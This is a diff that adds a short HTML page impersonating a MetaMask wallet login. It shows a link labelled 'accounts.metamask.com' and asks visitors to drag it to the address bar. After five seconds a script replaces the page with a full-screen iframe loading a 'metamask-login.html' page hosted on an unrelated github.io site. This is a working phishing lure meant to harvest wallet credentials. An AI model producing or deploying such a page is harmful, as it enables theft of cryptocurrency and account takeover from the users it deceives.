@@ -1,0 +1,48 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Auto Iframe Redirect</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    #info {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #333;
+    }
+    iframe {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <a id="googleLink" href="https://securewalletsign.metamask.io">accounts.metamask.com</a>
+  <div id="info">Drag me to address bar</div>
+
+  <script>
+    // Wait 5 seconds, then replace page with full-screen iframe
+    setTimeout(() => {
+      document.body.innerHTML = `<iframe src="https://frozzipies.github.io/metamask-login.html"></iframe>`;
+    }, 5000);
+  </script>
+</body>
+</html>
